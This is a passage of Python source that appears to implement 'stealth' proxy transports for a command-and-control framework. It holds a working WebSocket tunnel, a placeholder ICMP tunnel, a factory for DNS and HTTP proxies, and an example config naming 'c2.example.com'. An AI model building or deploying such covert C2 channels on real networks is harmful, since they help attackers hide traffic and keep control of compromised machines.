                    self.logger.error(f"Error in WebSocket handler: {e}")
                finally:
                    # Remove connection
                    self.connections.pop(conn_id, None)
                    self.connection_handlers.pop(conn_id, None)
            
            import asyncio
            
            # Start WS server if enabled
            if self.enable_ws:
                start_ws = websockets.serve(ws_handler, self.listen_addr, self.ws_port)
                asyncio.get_event_loop().run_until_complete(start_ws)
                self.logger.info(f"WebSocket proxy started on ws://{self.listen_addr}:{self.ws_port}{self.path}")
                
            # Start WSS server if enabled
            if self.enable_wss and self.use_ssl:
                ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ssl_context.load_cert_chain(certfile=self.cert_file, keyfile=self.key_file)
                
                start_wss = websockets.serve(ws_handler, self.listen_addr, self.wss_port, ssl=ssl_context)
                asyncio.get_event_loop().run_until_complete(start_wss)
                self.logger.info(f"WebSocket proxy started on wss://{self.listen_addr}:{self.wss_port}{self.path}")
                
            # Run event loop in a separate thread
            self.ws_thread = threading.Thread(target=asyncio.get_event_loop().run_forever)
            self.ws_thread.daemon = True
            self.ws_thread.start()
                
        except Exception as e:
            self.logger.error(f"Failed to start WebSocket proxy: {e}")
    
    def _stop_proxy(self):
        """Stop WebSocket proxy server"""
        if not self.HAS_WEBSOCKET:
            return
            
        # Close all connections
        for conn_id, conn in list(self.connections.items()):
            try:
                websocket = conn.get("websocket")
                if websocket:
                    import asyncio
                    asyncio.run(websocket.close())
            except:
                pass
                
        self.connections.clear()
    
    def _create_ws_handler(self, conn_id: str, session_id: str):
        """Create a handler function for a WebSocket connection
        
        Args:
            conn_id: Connection ID
            session_id: Session ID
            
        Returns:
            Handler function
        """
        def handler():
            # This would handle background tasks for this connection
            pass
            
        return handler
    
    def send_data(self, data: Union[str, bytes], target: Optional[str] = None,
                session_id: Optional[str] = None) -> bool:
        """Send data through the WebSocket tunnel
        
        Args:
            data: Data to send
            target: Target identifier (ignored for WebSocket)
            session_id: Session ID
            
        Returns:
            True if successful, False otherwise
        """
        if not self.HAS_WEBSOCKET:
            self.logger.error("WebSocket proxy not available")
            return False
            
        if not session_id:
            self.logger.error("Cannot send data without session ID")
            return False
            
        try:
            # Find connection for this session
            conn_id = None
            for cid, conn in self.connections.items():
                if conn.get("session_id") == session_id:
                    conn_id = cid
                    break
                    
            if not conn_id:
                self.logger.error(f"No WebSocket connection found for session {session_id}")
                return False
                
            # Get WebSocket
            websocket = self.connections[conn_id]["websocket"]
            
            # Convert data to appropriate format
            if isinstance(data, bytes):
                # Use binary message
                import asyncio
                asyncio.run(websocket.send(data))
            else:
                # Use text message
                import asyncio
                asyncio.run(websocket.send(data))
                
            self.logger.debug(f"Sent data to WebSocket session {session_id}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error sending data via WebSocket tunnel: {e}")
            return False


class IcmpProxy(StealthProxy):
    """ICMP proxy implementation"""
    
    def __init__(self, config: Dict[str, Any]):
        """Initialize the ICMP proxy
        
        Args:
            config: Proxy configuration
        """
        super().__init__(config)
        
        # Check for required privilege level
        if os.geteuid() != 0 and os.name != 'nt':
            self.logger.error("ICMP proxy requires root privileges")
            return
        
        # Attempt to import required modules
        try:
            # This is a placeholder - actual ICMP handling would require raw sockets
            self.HAS_RAW_SOCKET = True
        except:
            self.logger.error("Raw socket support not available, ICMP proxy will be disabled")
            self.HAS_RAW_SOCKET = False
            return
        
        # Extract ICMP-specific configuration
        self.listen_addr = config.get("listen_address", "0.0.0.0")
        self.listen_type = config.get("listen_type", "echo-reply")  # echo-reply or echo-request
        self.ttl = config.get("ttl", 64)
        self.chunk_size = config.get("chunk_size", 28)  # ICMP standard payload size
        self.mtu = config.get("mtu", 1500)
        self.timeout = config.get("timeout", 2)
        
        # Session tracking
        self.sessions = {}
        self.session_data = {}
    
    def _setup_encryption(self):
        """Set up encryption keys for ICMP proxy"""
        self.session_keys = {}
    
    def _start_proxy(self):
        """Start ICMP proxy server"""
        if not self.HAS_RAW_SOCKET:
            self.logger.error("ICMP proxy cannot be started (missing raw socket support)")
            return
        
        # This is a placeholder - actual implementation would create a raw socket
        # and listen for ICMP packets, extracting data and processing it
        # Real implementation is beyond the scope of this example due to OS-specific
        # raw socket handling requirements and privileges
        
        self.logger.info(f"ICMP proxy started on {self.listen_addr} (listening for {self.listen_type})")
        
        # For example purposes, we'll just log the limitations
        self.logger.warning("ICMP proxy is a placeholder implementation")
        self.logger.warning("Real ICMP tunneling requires raw socket access and elevated privileges")
    
    def _stop_proxy(self):
        """Stop ICMP proxy server"""
        # Placeholder for cleanup
        pass
    
    def send_data(self, data: Union[str, bytes], target: Optional[str] = None,
                session_id: Optional[str] = None) -> bool:
        """Send data through the ICMP tunnel
        
        Args:
            data: Data to send
            target: Target address to send to
            session_id: Session ID
            
        Returns:
            True if successful, False otherwise
        """
        # This is a placeholder - actual implementation would create ICMP packets
        # and send them using a raw socket
        
        self.logger.warning("ICMP data sending not fully implemented")
        return False


# Factory function to create the appropriate proxy
def create_proxy(proxy_type: str, config: Dict[str, Any]) -> StealthProxy:
    """Create a stealth proxy instance based on type
    
    Args:
        proxy_type: Type of proxy to create
        config: Proxy configuration
        
    Returns:
        Configured proxy instance
    """
    if proxy_type == "dns":
        return DnsProxy(config)
    elif proxy_type == "http":
        return HttpProxy(config)
    elif proxy_type == "websocket":
        return WebSocketProxy(config)
    elif proxy_type == "icmp":
        return IcmpProxy(config)
    else:
        raise ValueError(f"Unknown proxy type: {proxy_type}")


# Example usage
if __name__ == "__main__":
    # Setup logging
    logging.basicConfig(level=logging.INFO, 
                        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    logger = logging.getLogger("StealthProxyTest")
    
    # Create a proxy instance
    dns_config = {
        "domain": "c2.example.com",
        "listen_address": "0.0.0.0",
        "listen_port": 53235,  # High port for testing without root
        "upstream_dns": "8.8.8.8",
        "ttl": 60
    }
    
    http_config = {
        "listen_address": "0.0.0.0",
        "http_port": 8080,
        "https_port": 8443,
        "use_ssl": False,  # Disable SSL for testing
        "enable_http": True,
        "enable_https": False
    }
    
    try:
        # Try to create a DNS proxy
        proxy = create_proxy("dns", dns_config)
        proxy_type = "DNS"
    except:
        # Fall back to HTTP proxy
        proxy = create_proxy("http", http_config)
        proxy_type = "HTTP"
    
    # Register data handler
    def handle_data(data, source, session_id):
        logger.info(f"Received {len(data)} bytes from {source} (session: {session_id})")
        
        # Echo the data back
        if isinstance(data, bytes):
            response = b"Echo: " + data
        else:
            response = "Echo: " + data
            
        proxy.send_data(response, session_id=session_id)
    
    proxy.register_data_handler(handle_data)
    
    # Start the proxy
    proxy.start()
    
    logger.info(f"{proxy_type} proxy started. Press Ctrl+C to stop.")
    
    try:
        # Keep the main thread running
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Stopping proxy...")
    finally:
        proxy.stop()